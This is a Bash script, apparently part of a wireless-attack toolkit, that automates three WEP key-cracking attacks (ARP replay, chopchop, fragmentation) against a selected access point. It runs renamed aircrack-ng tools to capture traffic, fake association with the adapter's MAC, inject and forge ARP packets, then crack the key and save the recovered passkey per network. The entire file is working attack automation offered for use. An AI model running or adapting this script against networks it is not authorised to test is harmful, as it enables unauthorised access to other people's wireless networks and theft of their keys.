#!/bin/bash
#
#

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0 && tput bold)
BLUE=$(tput setaf 6 && tput bold)

Details(){

DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd | sed -e 's/\/Applications//g')

AP_essid=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $1 }' | sed -e 's/+/ /g' -e 's/^/"/g' -e 's/$/"/g')
AP_bssid=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $2 }')
AP_channel=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $4 }' | sed 's/Channel-//g')
AP_Name=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $1 }')
monX=$(cat $DIR/TempFolder/Chosen_Monitor_Interface.txt | awk '{ print $1 }')

}

MainMenu(){

rm $DIR/TempFolder/*.cap &> /dev/null
rm $DIR/TempFolder/*.csv &> /dev/null
rm $DIR/TempFolder/*.netxml &> /dev/null
rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null
rm $DIR/TempFolder/ChopchopCheck.txt &> /dev/null
rm $DIR/TempFolder/PacketforgeCheck.txt &> /dev/null
rm $DIR/TempFolder/ForgedARPPacket &> /dev/null
rm $DIR/TempFolder/WEPpasskey.txt &> /dev/null

while true
do

while true
do

clear
echo $RED"["$GREEN"1"$RED"]"$GREEN" = ARPreplay With Association"$STAND
echo $RED"["$GREEN"2"$RED"]"$GREEN" = Chopchop With Association"$STAND
echo $RED"["$GREEN"3"$RED"]"$GREEN" = Fragment With Association"$STAND
echo $RED"["$GREEN"p"$RED"]"$GREEN" = Proceed To Attack The Next Target"$STAND
echo ""
read -p $GREEN"Please choose an attack method$STAND: " MenuOptions

case $MenuOptions in
1|2|3|p)
break ;;
*) echo "Input was incorrect, please re-choose an option." ;;
esac
done

if [[ $MenuOptions == "1" ]]; then

   ARPreplayAttack

fi

if [[ $MenuOptions == "2" ]]; then

   ChopchopAttack

fi

if [[ $MenuOptions == "3" ]]; then

   FragmentAttack

fi

if [[ $MenuOptions == "p" ]]; then

   exit

fi

done
}

ARPreplayAttack(){

cd $DIR/TempFolder

rm $DIR/TempFolder/*.cap &> /dev/null
rm $DIR/TempFolder/*.csv &> /dev/null
rm $DIR/TempFolder/*.netxml &> /dev/null
rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null
rm $DIR/TempFolder/WEPpasskey.txt &> /dev/null

clear

xterm -geometry 100x16+800+0 -l -lf $DIR/TempFolder/AirodumpCheck.txt -e "$DIR/Applications/FS-airodump-ng.$Architecture -c $AP_channel --ignore-negative-one -w $DIR/TempFolder/wep --bssid $AP_bssid $monX" &

Kill_Airodump=$(echo "FS-airodump-ng.$Architecture")

echo "Checking for the access point..."
sleep 5

Airodump_Check=$(cat $DIR/TempFolder/AirodumpCheck.txt | grep "$AP_Name")
if [[ ! $Airodump_Check ]]; then

   echo "The access point wasn't detected, rechecking in 5 seconds..."
   sleep 5

   Airodump_Check=$(cat $DIR/TempFolder/AirodumpCheck.txt | grep "$AP_Name")
   if [[ ! $Airodump_Check ]]; then

      echo "The access point wasn't detected, rechecking in 5 seconds..."
      sleep 5

      Airodump_Check=$(cat $DIR/TempFolder/AirodumpCheck.txt | grep "$AP_Name")
      if [[ ! $Airodump_Check ]]; then

         echo "The access point wasn't detected, exiting wep attack menu..."
         sleep 3

         killall $Kill_Airodump &> /dev/null

         rm $DIR/TempFolder/*.cap &> /dev/null
         rm $DIR/TempFolder/*.csv &> /dev/null
         rm $DIR/TempFolder/*.netxml &> /dev/null
         rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null

         MainMenu

      fi

   fi

fi

clear
echo "Attempting Association..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x16+800+0 -l -lf $DIR/TempFolder/AssociationCheck.txt -e "$DIR/Applications/FS-aireplay-ng.$Architecture -1 0 -a $AP_bssid -h $mon0mac -e $AP_essid --ignore-negative-one $monX"

Aireplay_Association_Check=$(grep "Association successful :-)" $DIR/TempFolder/AssociationCheck.txt)
if [[ ! $Aireplay_Association_Check ]]; then

   echo "Association failed."
   sleep 3

   killall $Kill_Airodump

   rm $DIR/TempFolder/*.cap &> /dev/null
   rm $DIR/TempFolder/*.csv &> /dev/null
   rm $DIR/TempFolder/*.netxml &> /dev/null
   rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
   rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null

   MainMenu

fi

clear
echo "Attempting ARPreplay attack..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x12+800+275 -e "$DIR/Applications/FS-aireplay-ng.$Architecture -3 -b $AP_bssid -h $mon0mac --ignore-negative-one $monX" &

Kill_ARPreplay=$(echo "FS-aireplay-ng.$Architecture")

echo "Checking to see if the attack is working, Checking for a rapid data increase..."
sleep 10

Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
if [[ ! $Airodump_Data_Count_Check ]]; then

   echo "Rechecking in 5 seconds..."
   sleep 5

   Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
   if [[ ! $Airodump_Data_Count_Check ]]; then

      echo "Rechecking in 5 seconds..."
      sleep 5

      Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
      if [[ ! $Airodump_Data_Count_Check ]]; then

         echo "Rechecking in 5 seconds..."
         sleep 5

         Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
         if [[ ! $Airodump_Data_Count_Check ]]; then

            echo "Rechecking in 5 seconds..."
            sleep 5

            Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
            if [[ ! $Airodump_Data_Count_Check ]]; then

               echo "Rechecking in 5 seconds..."
               sleep 5

               Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
               if [[ ! $Airodump_Data_Count_Check ]]; then

                  killall $Kill_Airodump &> /dev/null
                  killall $Kill_ARPreplay &> /dev/null

                  rm $DIR/TempFolder/*.cap &> /dev/null
                  rm $DIR/TempFolder/*.csv &> /dev/null
                  rm $DIR/TempFolder/*.netxml &> /dev/null
                  rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
                  rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null

                  echo "The attack failed."
                  sleep 3

                  MainMenu

               fi
            fi
         fi
      fi
   fi
fi

clear
echo $RED"Proceeding to launch aircrack in 30 seconds..."$STAND
sleep 30
echo $RED"launching aircrack"$STAND
echo $RED"Press Ctrl+c on this window if you want to cancel the attack."$STAND

xterm -geometry 100x25+0+400 -e "$DIR/Applications/FS-aircrack-ng.$Architecture -b $AP_bssid $DIR/TempFolder/*.cap -l $DIR/TempFolder/WEPpasskey.txt"

Kill_Aircrack=$(echo "FS-aircrack-ng.$Architecture")

if [[ -f $DIR/TempFolder/WEPpasskey.txt ]]; then

   killall $Kill_ARPreplay &> /dev/null
   killall airodump-ng &> /dev/null
   killall aircrack-ng &> /dev/null

   passkey=$(cat $DIR/TempFolder/WEPpasskey.txt)
   clear
   echo $RED"Target Passkey:$STAND "$passkey""
   echo $RED"The recovered passkey will be coppied to$STAND $DIR/Passkeys/"$AP_Name".txt"
   echo ""
   read -p $GREEN"Press [Enter] to finish$STAND"

   clear
   echo "AP ESSID: $AP_essid" > $DIR/Passkeys/$AP_Name.txt
   echo "AP BSSID: $AP_bssid" >> $DIR/Passkeys/$AP_Name.txt
   echo "Passkey: $passkey" >> $DIR/Passkeys/$AP_Name.txt

   rm $DIR/TempFolder/*.cap &> /dev/null
   rm $DIR/TempFolder/*.csv &> /dev/null
   rm $DIR/TempFolder/*.netxml &> /dev/null
   rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
   rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null
   rm $DIR/TempFolder/WEPpasskey.txt &> /dev/null

   exit

fi

killall $Kill_Airodump &> /dev/null
killall $Kill_ARPreplay &> /dev/null
killall $Kill_Aircrack &> /dev/null

rm $DIR/TempFolder/*.cap &> /dev/null
rm $DIR/TempFolder/*.csv &> /dev/null
rm $DIR/TempFolder/*.netxml &> /dev/null
rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null
rm $DIR/TempFolder/WEPpasskey.txt &> /dev/null

clear
echo "The attack failed or it was cancelled."
sleep 3

}

ChopchopAttack(){

cd $DIR/TempFolder

clear

xterm -geometry 100x16+800+0 -l -lf $DIR/TempFolder/AirodumpCheck.txt -e "$DIR/Applications/FS-airodump-ng.$Architecture -c $AP_channel --ignore-negative-one -w $DIR/TempFolder/wep --bssid $AP_bssid $monX" &

Kill_Airodump=$(echo "FS-airodump-ng.$Architecture")

echo "Checking for the access point..."
sleep 5

Airodump_Check=$(cat $DIR/TempFolder/AirodumpCheck.txt | grep "$AP_Name")
if [[ ! $Airodump_Check ]]; then

   echo "The access point wasn't detected, rechecking in 5 seconds..."
   sleep 5

   Airodump_Check=$(cat $DIR/TempFolder/AirodumpCheck.txt | grep "$AP_Name")
   if [[ ! $Airodump_Check ]]; then

      echo "The access point wasn't detected, rechecking in 5 seconds..."
      sleep 5

      Airodump_Check=$(cat $DIR/TempFolder/AirodumpCheck.txt | grep "$AP_Name")
      if [[ ! $Airodump_Check ]]; then

         echo "The access point wasn't detected, exiting wep attack menu..."
         sleep 3

         killall $Kill_Airodump &> /dev/null

         rm $DIR/TempFolder/*.cap &> /dev/null
         rm $DIR/TempFolder/*.csv &> /dev/null
         rm $DIR/TempFolder/*.netxml &> /dev/null
         rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null

         MainMenu

      fi

   fi

fi

clear
echo "Attempting Association..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x16+800+0 -l -lf $DIR/TempFolder/AssociationCheck.txt -e "$DIR/Applications/FS-aireplay-ng.$Architecture -1 0 -a $AP_bssid -h $mon0mac -e $AP_essid --ignore-negative-one $monX"

Aireplay_Association_Check=$(grep "Association successful :-)" $DIR/TempFolder/AssociationCheck.txt)
if [[ ! $Aireplay_Association_Check ]]; then

   echo "Association failed."
   sleep 3

   killall $Kill_Airodump

   rm $DIR/TempFolder/*.cap &> /dev/null
   rm $DIR/TempFolder/*.csv &> /dev/null
   rm $DIR/TempFolder/*.netxml &> /dev/null
   rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
   rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null

   MainMenu

fi

killall $Kill_Airodump &> /dev/null

rm $DIR/TempFolder/*.cap &> /dev/null
rm $DIR/TempFolder/*.csv &> /dev/null
rm $DIR/TempFolder/*.netxml &> /dev/null
rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null

clear
echo "Attempting chopchop attack..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x25+800+0 -l -lf $DIR/TempFolder/ChopchopCheck.txt -e "yes | $DIR/Applications/FS-aireplay-ng.$Architecture -4 -e $AP_essid -b $AP_bssid -h $mon0mac --ignore-negative-one $monX"

Chopchop_Check=$(grep "Saving keystream" $DIR/TempFolder/ChopchopCheck.txt)
if [[ ! $Chopchop_Check ]]; then

   echo "Chopchop failed."
   sleep 3

   rm $DIR/TempFolder/ChopchopCheck.txt &> /dev/null
   rm $DIR/TempFolder/*.cap &> /dev/null

   MainMenu

fi

clear
echo "Attempting Packetforge..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x28+0+500 -l -lf $DIR/TempFolder/PacketforgeCheck.txt -e "$DIR/Applications/FS-packetforge-ng.$Architecture -0 -a $AP_bssid -h $mon0mac -k 255.255.255.255 -l 255.255.255.255 -y $DIR/TempFolder/*.xor -w $DIR/TempFolder/ForgedARPPacket $monX"

Packetforge_Check=$(grep "Wrote packet to:" $DIR/TempFolder/PacketforgeCheck.txt)
if [[ ! $Packetforge_Check ]]; then

   echo "Packetforge failed."
   sleep 3

   rm $DIR/TempFolder/ChopchopCheck.txt &> /dev/null
   rm $DIR/TempFolder/PacketforgeCheck.txt &> /dev/null
   rm $DIR/TempFolder/ForgedARPPacket &> /dev/null

   MainMenu

fi

xterm -geometry 100x16+800+0 -l -lf $DIR/TempFolder/AirodumpCheck.txt -e "$DIR/Applications/FS-airodump-ng.$Architecture -c $AP_channel --ignore-negative-one -w $DIR/TempFolder/wep --bssid $AP_bssid $monX" &

clear
echo "Attempting Interactive..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x12+800+275 -e "$DIR/Applications/FS-aireplay-ng.$Architecture -2 -h $mon0mac -F -r $DIR/TempFolder/ForgedARPPacket --ignore-negative-one $monX" &

Kill_ARPreplay=$(echo "FS-aireplay-ng.$Architecture")

echo "Checking to see if the attack is working, Checking for a rapid data increase..."
sleep 10

Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
if [[ ! $Airodump_Data_Count_Check ]]; then

   echo "Rechecking in 5 seconds..."
   sleep 5

   Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
   if [[ ! $Airodump_Data_Count_Check ]]; then

      echo "Rechecking in 5 seconds..."
      sleep 5

      Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
      if [[ ! $Airodump_Data_Count_Check ]]; then

         echo "Rechecking in 5 seconds..."
         sleep 5

         Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
         if [[ ! $Airodump_Data_Count_Check ]]; then

            echo "Rechecking in 5 seconds..."
            sleep 5

            Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
            if [[ ! $Airodump_Data_Count_Check ]]; then

               echo "Rechecking in 5 seconds..."
               sleep 5

               Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
               if [[ ! $Airodump_Data_Count_Check ]]; then

                  kill $Kill_Airodump &> /dev/null
                  kill $Kill_ARPreplay &> /dev/null

                  echo "The attack failed."
                  sleep 3

                  rm $DIR/TempFolder/*.cap &> /dev/null
                  rm $DIR/TempFolder/*.csv &> /dev/null
                  rm $DIR/TempFolder/*.netxml &> /dev/null
                  rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
                  rm $DIR/TempFolder/ChopchopCheck.txt &> /dev/null
                  rm $DIR/TempFolder/PacketforgeCheck.txt &> /dev/null
                  rm $DIR/TempFolder/ForgedARPPacket &> /dev/null

                  MainMenu

               fi
            fi
         fi
      fi
   fi
fi

clear
echo $RED"Proceeding to launch aircrack in 30 seconds..."$STAND
sleep 30
echo $RED"launching aircrack"$STAND
echo $RED"Press Ctrl+c on this window if you want to cancel the attack."$STAND

xterm -geometry 100x25+0+400 -e "$DIR/Applications/FS-aircrack-ng.$Architecture -b $AP_bssid $DIR/TempFolder/*.cap -l $DIR/TempFolder/WEPpasskey.txt"

if [[ -f $DIR/TempFolder/WEPpasskey.txt ]]; then

   killall $Kill_Airodump &> /dev/null
   killall $Kill_ARPreplay &> /dev/null
   killall $Kill_Aircrack &> /dev/null

   passkey=$(cat $DIR/TempFolder/WEPpasskey.txt)
   clear
   echo $RED"Target Passkey:$STAND "$passkey""
   echo $RED"The recovered passkey will be coppied to$STAND $DIR/Passkeys/"$AP_Name".txt"
   echo ""
   read -p $GREEN"Press [Enter] to finish$STAND"

   clear
   echo "AP ESSID: $AP_essid" > $DIR/Passkeys/$AP_Name.txt
   echo "AP BSSID: $AP_bssid" >> $DIR/Passkeys/$AP_Name.txt
   echo "Passkey: $passkey" >> $DIR/Passkeys/$AP_Name.txt

   rm $DIR/TempFolder/*.cap &> /dev/null
   rm $DIR/TempFolder/*.csv &> /dev/null
   rm $DIR/TempFolder/*.netxml &> /dev/null
   rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
   rm $DIR/TempFolder/ChopchopCheck.txt &> /dev/null
   rm $DIR/TempFolder/PacketforgeCheck.txt &> /dev/null
   rm $DIR/TempFolder/ForgedARPPacket &> /dev/null

   exit

fi

killall $Kill_Airodump &> /dev/null
killall $Kill_ARPreplay &> /dev/null
killall $Kill_Aircrack &> /dev/null

rm $DIR/TempFolder/*.cap &> /dev/null
rm $DIR/TempFolder/*.csv &> /dev/null
rm $DIR/TempFolder/*.netxml &> /dev/null
rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
rm $DIR/TempFolder/ChopchopCheck.txt &> /dev/null
rm $DIR/TempFolder/PacketforgeCheck.txt &> /dev/null
rm $DIR/TempFolder/ForgedARPPacket &> /dev/null

clear
echo "The attack failed or it was cancelled."
sleep 3

}

FragmentAttack(){

cd $DIR/TempFolder

clear

xterm -geometry 100x16+800+0 -l -lf $DIR/TempFolder/AirodumpCheck.txt -e "$DIR/Applications/FS-airodump-ng.$Architecture -c $AP_channel --ignore-negative-one -w $DIR/TempFolder/wep --bssid $AP_bssid $monX" &

Kill_Airodump=$(echo "FS-airodump-ng.$Architecture")

echo "Checking for the access point..."
sleep 5

Airodump_Check=$(cat $DIR/TempFolder/AirodumpCheck.txt | grep "$AP_Name")
if [[ ! $Airodump_Check ]]; then

   echo "The access point wasn't detected, rechecking in 5 seconds..."
   sleep 5

   Airodump_Check=$(cat $DIR/TempFolder/AirodumpCheck.txt | grep "$AP_Name")
   if [[ ! $Airodump_Check ]]; then

      echo "The access point wasn't detected, rechecking in 5 seconds..."
      sleep 5

      Airodump_Check=$(cat $DIR/TempFolder/AirodumpCheck.txt | grep "$AP_Name")
      if [[ ! $Airodump_Check ]]; then

         echo "The access point wasn't detected, exiting wep attack menu..."
         sleep 3

         killall $Kill_Airodump &> /dev/null

         rm $DIR/TempFolder/*.cap &> /dev/null
         rm $DIR/TempFolder/*.csv &> /dev/null
         rm $DIR/TempFolder/*.netxml &> /dev/null
         rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null

         MainMenu

      fi

   fi

fi

clear
echo "Attempting Association..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x16+800+0 -l -lf $DIR/TempFolder/AssociationCheck.txt -e "$DIR/Applications/FS-aireplay-ng.$Architecture -1 0 -a $AP_bssid -h $mon0mac -e $AP_essid --ignore-negative-one $monX"

Aireplay_Association_Check=$(grep "Association successful :-)" $DIR/TempFolder/AssociationCheck.txt)
if [[ ! $Aireplay_Association_Check ]]; then

   echo "Association failed."
   sleep 3

   killall $Kill_Airodump

   rm $DIR/TempFolder/*.cap &> /dev/null
   rm $DIR/TempFolder/*.csv &> /dev/null
   rm $DIR/TempFolder/*.netxml &> /dev/null
   rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
   rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null

   MainMenu

fi

killall $Kill_Airodump &> /dev/null

rm $DIR/TempFolder/*.cap &> /dev/null
rm $DIR/TempFolder/*.csv &> /dev/null
rm $DIR/TempFolder/*.netxml &> /dev/null
rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
rm $DIR/TempFolder/AssociationCheck.txt &> /dev/null

clear
echo "Attempting Fragment..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x12+675+500 -l -lf $DIR/TempFolder/FragmentCheck.txt -e "yes | $DIR/Applications/FS-aireplay-ng.$Architecture -5 -F -b $AP_bssid -h $mon0mac --ignore-negative-one $monX"

Fragment_Check=$(grep "Now you can build a packet with packetforge-ng" $DIR/TempFolder/FragmentCheck.txt)
if [[ ! $Fragment_Check ]]; then

   echo "Fragment failed."
   sleep 3

   rm $DIR/TempFolder/FragmentCheck.txt &> /dev/null

   killall $Kill_Airodump &> /dev/null

   MainMenu

fi

clear
echo "Attempting Packetforge..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x28+0+500 -l -lf $DIR/TempFolder/PacketforgeCheck.txt -e "$DIR/Applications/FS-packetforge-ng.$Architecture -0 -a $AP_bssid -h $mon0mac -k 255.255.255.255 -l 255.255.255.255 -y $DIR/TempFolder/*.xor -w $DIR/TempFolder/ForgedARPPacket $monX"

Packetforge_Check=$(grep "Wrote packet to:" $DIR/TempFolder/PacketforgeCheck.txt)
if [[ ! $Packetforge_Check ]]; then

   echo "Packetforge failed."
   sleep 3

   rm $DIR/TempFolder/FragmentCheck.txt &> /dev/null
   rm $DIR/TempFolder/PacketforgeCheck.txt &> /dev/null
   rm $DIR/TempFolder/ForgedARPPacket &> /dev/null

   MainMenu

fi

xterm -geometry 100x16+800+0 -l -lf $DIR/TempFolder/AirodumpCheck.txt -e "$DIR/Applications/FS-airodump-ng.$Architecture -c $AP_channel --ignore-negative-one -w $DIR/TempFolder/wep --bssid $AP_bssid $monX" &

clear
echo "Attempting Interactive..."
sleep 3

mon0mac=$(macchanger -s $monX | grep Current | awk '{ print $3 }')

xterm -geometry 100x12+800+275 -e "$DIR/Applications/FS-aireplay-ng.$Architecture -2 -h $mon0mac -F -r $DIR/TempFolder/ForgedARPPacket --ignore-negative-one $monX" &

Kill_ARPreplay=$(echo "FS-aireplay-ng.$Architecture")

echo "Checking to see if the attack is working, Checking for a rapid data increase..."
sleep 10

Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
if [[ ! $Airodump_Data_Count_Check ]]; then

   echo "Rechecking in 5 seconds..."
   sleep 5

   Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
   if [[ ! $Airodump_Data_Count_Check ]]; then

      echo "Rechecking in 5 seconds..."
      sleep 5

      Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
      if [[ ! $Airodump_Data_Count_Check ]]; then

         echo "Rechecking in 5 seconds..."
         sleep 5

         Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
         if [[ ! $Airodump_Data_Count_Check ]]; then

            echo "Rechecking in 5 seconds..."
            sleep 5

            Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
            if [[ ! $Airodump_Data_Count_Check ]]; then

               echo "Rechecking in 5 seconds..."
               sleep 5

               Airodump_Data_Count_Check=$(tac $DIR/TempFolder/AirodumpCheck.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
               if [[ ! $Airodump_Data_Count_Check ]]; then

                  kill $Kill_Airodump &> /dev/null
                  kill $Kill_ARPreplay &> /dev/null

                  echo "The attack failed."
                  sleep 3

                  rm $DIR/TempFolder/*.cap &> /dev/null
                  rm $DIR/TempFolder/*.csv &> /dev/null
                  rm $DIR/TempFolder/*.netxml &> /dev/null
                  rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
                  rm $DIR/TempFolder/FragmentCheck.txt &> /dev/null
                  rm $DIR/TempFolder/PacketforgeCheck.txt &> /dev/null
                  rm $DIR/TempFolder/ForgedARPPacket &> /dev/null

                  MainMenu

               fi
            fi
         fi
      fi
   fi
fi

clear
echo $RED"Proceeding to launch aircrack in 30 seconds..."$STAND
sleep 30
echo $RED"launching aircrack"$STAND
echo $RED"Press Ctrl+c on this window if you want to cancel the attack."$STAND

xterm -geometry 100x25+0+400 -e "$DIR/Applications/FS-aircrack-ng.$Architecture -b $AP_bssid $DIR/TempFolder/*.cap -l $DIR/TempFolder/WEPpasskey.txt"

if [[ -f $DIR/TempFolder/WEPpasskey.txt ]]; then

   killall $Kill_Airodump &> /dev/null
   killall $Kill_ARPreplay &> /dev/null
   killall $Kill_Aircrack &> /dev/null

   passkey=$(cat $DIR/TempFolder/WEPpasskey.txt)
   clear
   echo $RED"Target Passkey:$STAND "$passkey""
   echo $RED"The recovered passkey will be coppied to$STAND $DIR/Passkeys/"$AP_Name".txt"
   echo ""
   read -p $GREEN"Press [Enter] to finish$STAND"

   clear
   echo "AP ESSID: $AP_essid" > $DIR/Passkeys/$AP_Name.txt
   echo "AP BSSID: $AP_bssid" >> $DIR/Passkeys/$AP_Name.txt
   echo "Passkey: $passkey" >> $DIR/Passkeys/$AP_Name.txt

   rm $DIR/TempFolder/*.cap &> /dev/null
   rm $DIR/TempFolder/*.csv &> /dev/null
   rm $DIR/TempFolder/*.netxml &> /dev/null
   rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
   rm $DIR/TempFolder/FragmentCheck.txt &> /dev/null
   rm $DIR/TempFolder/PacketforgeCheck.txt &> /dev/null
   rm $DIR/TempFolder/ForgedARPPacket &> /dev/null

   exit

fi

killall $Kill_Airodump &> /dev/null
killall $Kill_ARPreplay &> /dev/null
killall $Kill_Aircrack &> /dev/null

rm $DIR/TempFolder/*.cap &> /dev/null
rm $DIR/TempFolder/*.csv &> /dev/null
rm $DIR/TempFolder/*.netxml &> /dev/null
rm $DIR/TempFolder/AirodumpCheck.txt &> /dev/null
rm $DIR/TempFolder/FragmentCheck.txt &> /dev/null
rm $DIR/TempFolder/PacketforgeCheck.txt &> /dev/null
rm $DIR/TempFolder/ForgedARPPacket &> /dev/null

clear
echo "The attack failed or it was cancelled."
sleep 3

}

clear
Details
MainMenu
